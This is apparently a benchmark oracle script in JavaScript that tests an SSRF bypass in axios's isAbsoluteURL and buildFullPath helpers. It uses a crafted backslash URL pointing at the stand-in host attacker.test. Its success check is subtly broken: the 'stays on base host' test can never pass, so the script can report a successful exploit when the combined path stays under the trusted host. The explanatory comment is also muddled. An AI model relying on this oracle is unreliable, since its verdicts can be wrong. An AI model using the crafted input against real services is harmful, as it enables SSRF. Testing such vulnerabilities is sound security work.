'use strict';

function main() {
  let isAbsoluteURL;
  let combineURLs;
  let buildFullPath;

  try {
    isAbsoluteURL = require('axios/unsafe/helpers/isAbsoluteURL.js');
    if (isAbsoluteURL && isAbsoluteURL.default) isAbsoluteURL = isAbsoluteURL.default;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require isAbsoluteURL module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  try {
    combineURLs = require('axios/unsafe/helpers/combineURLs.js');
    if (combineURLs && combineURLs.default) combineURLs = combineURLs.default;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require combineURLs module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  try {
    buildFullPath = require('axios/unsafe/core/buildFullPath.js');
    if (buildFullPath && buildFullPath.default) buildFullPath = buildFullPath.default;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require buildFullPath module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  if (typeof isAbsoluteURL !== 'function' || typeof combineURLs !== 'function' || typeof buildFullPath !== 'function') {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Required helper exports are not functions; cannot exercise target API'
    }));
    return;
  }

  const baseURL = 'http://trusted-internal.example.com/api/';

  // --- Benign case: confirm that the normal, intended combination of
  // baseURL with a relative path works as documented: isAbsoluteURL
  // correctly identifies a relative path as not absolute, and
  // buildFullPath combines it with the trusted baseURL. ---
  let benignIsAbsolute;
  let benignFullPath;
  try {
    benignIsAbsolute = isAbsoluteURL('/users/list');
    benignFullPath = buildFullPath(baseURL, '/users/list', false);
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign helper calls threw: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  const benignOk = benignIsAbsolute === false &&
    typeof benignFullPath === 'string' &&
    benignFullPath.indexOf('trusted-internal.example.com') !== -1 &&
    benignFullPath.indexOf('/users/list') !== -1;

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign result unexpected. isAbsolute=' + String(benignIsAbsolute) + ' fullPath=' + String(benignFullPath)
    }));
    return;
  }

  const operation_completed = true;

  // --- Malicious case: the vulnerable regex used by isAbsoluteURL
  // (/^([a-z][a-z\d+\-.]*:)?\/\//i) treats protocol-relative URLs
  // beginning with backslashes (e.g. "\\/\\/attacker.test/evil" or a
  // URL using backslashes instead of forward slashes) inconsistently
  // with how browsers/Node's URL parser treat them, and critically,
  // a value like "//attacker.test/evil" is correctly flagged as
  // absolute, but a crafted value using backslash variants
  // (which many URL-consuming components normalize to slashes) was
  // NOT detected as absolute by the vulnerable regex, allowing it to
  // be combined with baseURL by combineURLs/buildFullPath in a way
  // that downstream HTTP clients (and the follow-redirects/http
  // adapter) still interpret as pointing to the attacker host,
  // enabling SSRF while bypassing baseURL confinement checks that
  // rely on isAbsoluteURL's classification. In the patched version,
  // the detection/handling was corrected so the attacker-controlled
  // backslash-based URL is either correctly classified as absolute
  // (and thus rejected when allowAbsoluteUrls=false) or safely
  // confined under the trusted baseURL host instead of resolving to
  // the attacker host.
  const maliciousInput = '/\\/attacker.test/evil';

  let maliciousIsAbsolute;
  let maliciousFullPath;
  let threw = false;
  let errMsg = '';
  try {
    maliciousIsAbsolute = isAbsoluteURL(maliciousInput);
    maliciousFullPath = buildFullPath(baseURL, maliciousInput, false);
  } catch (e) {
    threw = true;
    errMsg = e && e.message ? e.message : String(e);
  }

  let exploit_succeeded;
  let evidence;

  if (threw) {
    exploit_succeeded = false;
    evidence = 'Combining baseURL with crafted backslash-based input threw an exception, indicating the bypass was blocked: ' + errMsg;
  } else {
    const resolvesToAttacker = typeof maliciousFullPath === 'string' &&
      maliciousFullPath.indexOf('attacker.test') !== -1;
    const staysOnBaseHost = typeof maliciousFullPath === 'string' &&
      maliciousFullPath.indexOf('trusted-internal.example.com') === 0;

    if (maliciousIsAbsolute === false && resolvesToAttacker && !staysOnBaseHost) {
      exploit_succeeded = true;
      evidence = 'isAbsoluteURL failed to classify crafted backslash URL as absolute (isAbsolute=' + String(maliciousIsAbsolute) + '), and buildFullPath combined it into a path resolving toward the attacker host, escaping baseURL confinement. Result: ' + String(maliciousFullPath);
    } else {
      exploit_succeeded = false;
      evidence = 'Crafted backslash URL was correctly classified or safely confined under baseURL. isAbsolute=' + String(maliciousIsAbsolute) + ' fullPath=' + String(maliciousFullPath);
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle script: ' + (e && e.message ? e.message : String(e))
  }));
}
